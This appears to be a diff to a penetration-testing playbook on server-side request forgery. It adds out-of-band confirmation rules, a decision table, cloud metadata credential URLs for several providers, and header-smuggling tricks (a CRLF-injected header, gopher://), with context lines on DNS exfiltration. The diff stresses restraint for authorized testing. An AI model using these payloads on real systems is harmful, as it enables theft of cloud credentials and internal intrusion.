@@ -44,9 +44,20 @@ OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canary
 2. **Send the request** to the target endpoint.
 3. **Wait 30–120 seconds**, then poll the OOB listener.
 4. **Only after a confirmed callback** do you claim SSRF.
-5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.
+5. If zero callbacks across the sinks you actually sent: do not claim SSRF, even if an error string contains your URL. A miss on one parameter is not "this host has no SSRF" — other fetchers (webhooks, PDF, import, avatar) are separate sinks.
 
-**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.
+**False positive to retire immediately:** the server prints `The Web application at http://<your-host>/ could not be found` or otherwise interpolates the URL into an error. That is string formatting. Zero DNS and zero HTTP on your listener means no fetch. Resolvers that only accept an internal path (`/sites/...`, a stored file id) are not URL fetchers.
+
+## Decision tree
+
+| After the OOB probe | Meaning | Next single step |
+|---|---|---|
+| HTTP hit from their IP, your path echoed | Full or partial fetch | One internal URL (metadata or `127.0.0.1` on a known port) |
+| DNS only, no HTTP | Resolver ran; the client may have blocked the connect | Try a redirect and an IP literal. DNS-only to your public host is Low until an internal target behaves differently |
+| Their error body contains metadata text or `ami-id` / `computeMetadata` | Full-read SSRF | Stop after one credential or one secret. That body is the proof |
+| Link-local returns 401/403 "missing header" / "IMDSv2 required" | You **reached** metadata | Add the header (below). Do not call it a miss |
+| Different timing or status for `127.0.0.1:1` vs `:22` vs a closed port you already know | Blind oracle | Confirm with n≥10 pairs. Then one high-value port, not a sweep |
+| URL echoed, listener silent | Not SSRF | Next parameter |
 
 ---
 
@@ -144,9 +155,7 @@ X-Cache headers revealing internal hostnames
    - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
    - Exfil via DNS: encode response data in subdomain of your callback domain
 
-8. **Enumerate the internal network** using timing differences and error message variations:
-   - Port scan via response time (`connection refused` vs timeout)
-   - Check error messages for hostname/IP leakage
+8. **One internal target at a time** — metadata first, then a short known-service list (`80`, `443`, `6443`, `6379`, `9200`, `8080`). Use status/body differences. A timing oracle needs n≥10 paired samples (open vs closed), not one slow response. Do not sweep port ranges or adjacent subnets. Stop at the first sensitive body.
 
 9. **Chain findings** — if you have SSRF to internal services, look for:
    - Unauthenticated admin endpoints
@@ -184,9 +193,22 @@ http://169.254.169.254/computeMetadata/v1/project/project-id
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/user-data
 
-# Azure
+# Azure — requires header Metadata: true (400 without it still proves link-local reach)
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# AWS IMDSv2 — PUT http://169.254.169.254/latest/api/token
+#   header X-aws-ec2-metadata-token-ttl-seconds: 60, then GET metadata with
+#   X-aws-ec2-metadata-token: <token>. Hop-limit 1 blocks an extra proxy; a client
+#   ON the instance (headless browser, sidecar-less fetcher) still gets the token.
+# ECS:  http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+# EKS pod identity (when the env advertises it): http://169.254.170.23/v1/credentials
+# Alibaba: http://100.100.100.100/latest/meta-data/
+# Oracle:  http://169.254.169.254/opc/v2/instance/  (header Authorization: Bearer Oracle)
+# DigitalOcean: http://169.254.169.254/metadata/v1/
+# AWS IPv6 IMDS: http://[fd00:ec2::254]/latest/meta-data/
 ```
+
+Header-less clients cannot call IMDSv2/GCP/Azure directly. In order: (1) product "custom headers" or a forward of incoming headers, (2) one CRLF in the URL (`%0d%0aMetadata-Flavor:%20Google`) if the client does not strip CR/LF — proof is the token body or a Collaborator request showing the injected header, (3) `gopher://` / raw dict to port 80 with the header bytes, (4) a headless render where `fetch()` sets the header. A 302 from your server does not attach third-party headers.
 
 ### Localhost/Internal Port Payloads
 ```bash
